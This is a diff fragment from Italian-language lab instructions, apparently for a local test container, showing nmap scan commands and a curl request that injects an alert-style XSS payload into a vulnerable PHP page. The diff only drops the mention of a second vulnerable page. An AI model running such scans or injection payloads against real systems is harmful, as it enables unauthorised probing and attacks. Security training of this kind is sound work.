@@ -44,7 +44,7 @@ nmap -sS 172.18.0.3
 nmap -sV 172.18.0.3
 ```
 
-2) XSS sfruttando la pagina http://172.18.0.3/xssVuln.php o http://172.18.0.3/xssVulnCookie.php. Per farlo da shell possiamo usare il comando curl come segue
+2) XSS sfruttando la pagina http://172.18.0.3/xssVuln.php. Per farlo da shell possiamo usare il comando curl come segue
 ```
 curl 'http://172.18.0.3/xssVuln.php?comment=%3Cscript%3Ealert%28%27XSS%21%27%29%3C%2Fscript%3E'
 ```
